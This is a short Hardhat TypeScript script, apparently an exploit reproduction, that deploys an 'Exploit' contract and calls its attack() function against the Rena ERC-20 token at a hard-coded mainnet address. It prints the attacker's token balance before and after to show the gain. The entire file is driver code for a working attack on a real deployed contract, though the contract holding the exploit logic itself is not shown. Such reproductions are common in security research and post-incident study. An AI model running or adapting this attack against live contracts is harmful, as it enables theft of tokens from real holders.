import hre from "hardhat"
import {Exploit__factory, IERC20__factory} from "../typechain";

async function main() {
  const [signer] = await hre.ethers.getSigners();
  const exploit = await new Exploit__factory(signer).deploy();
  const rena = IERC20__factory.connect("0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76",signer);
  console.log("Rena balance of attacker:",hre.ethers.utils.formatUnits(await rena.balanceOf(signer.address),await rena.decimals()))
  console.log("Exploiting...")
  await exploit.attack();
  console.log("Exploit complete.")
  console.log("Rena balance of attacker:",hre.ethers.utils.formatUnits(await rena.balanceOf(signer.address),await rena.decimals()))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
